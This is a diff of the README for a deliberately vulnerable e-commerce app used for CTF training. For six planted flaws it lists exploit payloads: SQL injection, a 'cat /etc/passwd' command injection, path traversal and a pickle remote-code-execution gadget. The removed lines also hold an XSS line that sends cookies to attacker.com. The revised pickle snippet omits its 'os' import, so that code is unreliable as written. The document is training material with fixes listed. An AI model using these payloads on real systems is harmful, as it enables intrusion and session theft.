@@ -1,156 +1,122 @@
 # VulnShop - Vulnerable E-commerce Platform
 
-A deliberately vulnerable e-commerce platform for security testing and CTF challenges. This application contains 6 different vulnerabilities that you need to exploit to find the flags.
+A deliberately vulnerable e-commerce platform for CTF challenges and security testing practice.
 
 ## Setup
 
-1. Create a virtual environment:
-```bash
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-```
-
-2. Install dependencies:
+1. Install dependencies:
 ```bash
 pip install -r requirements.txt
 ```
 
-3. Initialize the database and create sample data:
-```bash
-python init_db.py
-```
-
-4. Run the application:
+2. Initialize the database:
 ```bash
 python app.py
 ```
 
-The application will be available at http://localhost:5000
+3. Access the application at `http://localhost:5000`
+
+Default admin credentials:
+- Username: admin
+- Password: admin123
 
 ## Vulnerabilities
 
 ### 1. SQL Injection in Product Search
-**Endpoint**: `/search`
-**Flag**: `FLAG{sql_1nj3ct10n_1s_d4ng3r0us}`
-
-The search functionality is vulnerable to SQL injection. The query is constructed using string concatenation:
-```python
-cursor.execute(f"SELECT * FROM product WHERE name LIKE '%{query}%' OR description LIKE '%{query}%'")
-```
-
+**Location**: `/search` endpoint
+**Vulnerability**: The search query is directly concatenated into the SQL statement without proper sanitization.
 **Exploitation**:
-1. Visit the search page
-2. Enter the following payload:
+```sql
+' UNION SELECT 1,2,3,4,5,6 FROM user--
 ```
-' UNION SELECT id, username, email, password FROM user WHERE username='admin' --
-```
-3. This will reveal the admin user's password containing the flag
+This will reveal user information from the database.
 
 ### 2. Command Injection in Image Processing
-**Endpoint**: `/process-image`
-**Flag**: `FLAG{c0mm4nd_1nj3ct10n_br34ks_s3cur1ty}`
-
-The image processing endpoint uses shell=True and direct string concatenation:
-```python
-command = f"convert {image_path} -resize 800x600 {image_path}"
-```
-
+**Location**: `/process-image` endpoint
+**Vulnerability**: User input is directly used in a shell command without proper sanitization.
 **Exploitation**:
-1. Upload an image
-2. Modify the filename to include a command:
+```bash
+; cat /etc/passwd
 ```
-image.jpg; cat /etc/passwd
-```
-3. The command will be executed on the server
+This will execute arbitrary commands on the server.
 
 ### 3. XSS in Product Reviews
-**Endpoint**: `/add-review/<product_id>`
-**Flag**: `FLAG{xss_1s_4_br0ws3r_vuln3r4b1l1ty}`
-
-Reviews are rendered without any sanitization:
-```python
-return f'<div class="review"><p>Rating: {rating}</p><p>Review: {review}</p></div>'
-```
-
+**Location**: `/add-review/<product_id>` endpoint
+**Vulnerability**: User input is directly rendered in HTML without proper escaping.
 **Exploitation**:
-1. Go to any product page
-2. Submit a review with the following payload:
 ```html
-<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
+<script>alert(document.cookie)</script>
 ```
-3. When other users view the product, their cookies will be sent to the attacker
+This will execute arbitrary JavaScript in the context of the page.
 
 ### 4. Directory Traversal in Product Images
-**Endpoint**: `/product-image/<filename>`
-**Flag**: `FLAG{4_d1r3ct0ry_tr4v3rs4l_1s_n0t_s3cur3}`
-
-The image endpoint doesn't validate the filename:
-```python
-return send_file(f'uploads/{filename}')
-```
-
+**Location**: `/product-image/<filename>` endpoint
+**Vulnerability**: No path sanitization when accessing files.
 **Exploitation**:
-1. Try accessing files outside the uploads directory:
 ```
 ../../../etc/passwd
 ```
-2. The flag is in a secret file in the uploads directory
+This will allow access to files outside the intended directory.
 
 ### 5. Insecure Deserialization in Cart
-**Endpoint**: `/update-cart`
-**Flag**: `FLAG{d3s3r14l1z4t10n_1s_r1sky}`
-
-The cart update endpoint uses pickle.loads() on user input:
-```python
-cart = pickle.loads(base64.b64decode(cart_data))
-```
-
+**Location**: `/update-cart` endpoint
+**Vulnerability**: User input is deserialized without proper validation.
 **Exploitation**:
-1. Create a malicious pickle object:
 ```python
 import pickle
-import os
+import base64
 
 class RCE:
     def __reduce__(self):
-        cmd = ('cat /etc/passwd')
-        return os.system, (cmd,)
+        return (os.system, ('cat /etc/passwd',))
 
-pickled = pickle.dumps(RCE())
-print(base64.b64encode(pickled).decode())
+payload = base64.b64encode(pickle.dumps(RCE())).decode()
 ```
-2. Submit the encoded payload to the cart update endpoint
+Send this payload in the `cart` parameter.
 
 ### 6. Weak Password Reset
-**Endpoint**: `/reset-password`
-**Flag**: `FLAG{w34k_t0k3ns_4r3_br34k4bl3}`
-
-The password reset uses simple base64 encoding:
-```python
-token = base64.b64encode(email.encode()).decode()
-```
-
+**Location**: `/reset-password` endpoint
+**Vulnerability**: Weak token generation using base64 encoding of email.
 **Exploitation**:
-1. Request a password reset for a user
-2. The token will be returned in the response
-3. Decode the token to get the email:
-```python
-import base64
-decoded = base64.b64decode(token).decode()
-print(decoded)
-```
+1. Request password reset for a user
+2. The token is simply base64 encoded email
+3. Decode the token to get the email
+4. Use the token to reset the password
 
-## Test Accounts
+## Security Best Practices
 
-1. Regular User:
-   - Username: test
-   - Password: password123
-   - Email: test@example.com
+To fix these vulnerabilities:
 
-2. Admin User:
-   - Username: admin
-   - Password: FLAG{sql_1nj3ct10n_1s_d4ng3r0us}
-   - Email: admin@vulnshop.com
+1. SQL Injection:
+   - Use parameterized queries
+   - Implement proper input validation
+   - Use ORM methods instead of raw SQL
 
-## Note
-This application is intentionally vulnerable and should only be used in a controlled environment for educational purposes. The vulnerabilities demonstrated here should never be implemented in production applications. 
+2. Command Injection:
+   - Avoid using shell=True
+   - Use subprocess.run with a list of arguments
+   - Implement proper input validation
+
+3. XSS:
+   - Use proper HTML escaping
+   - Implement Content Security Policy
+   - Use template escaping
+
+4. Directory Traversal:
+   - Implement proper path sanitization
+   - Use os.path.abspath and os.path.normpath
+   - Validate file paths
+
+5. Insecure Deserialization:
+   - Avoid using pickle for user input
+   - Use JSON or other safe serialization formats
+   - Implement proper input validation
+
+6. Weak Password Reset:
+   - Use cryptographically secure random tokens
+   - Implement token expiration
+   - Use proper token storage
+
+## Disclaimer
+
+This application is intentionally vulnerable and should only be used for educational purposes in controlled environments. Do not deploy this application in production or expose it to the internet. 
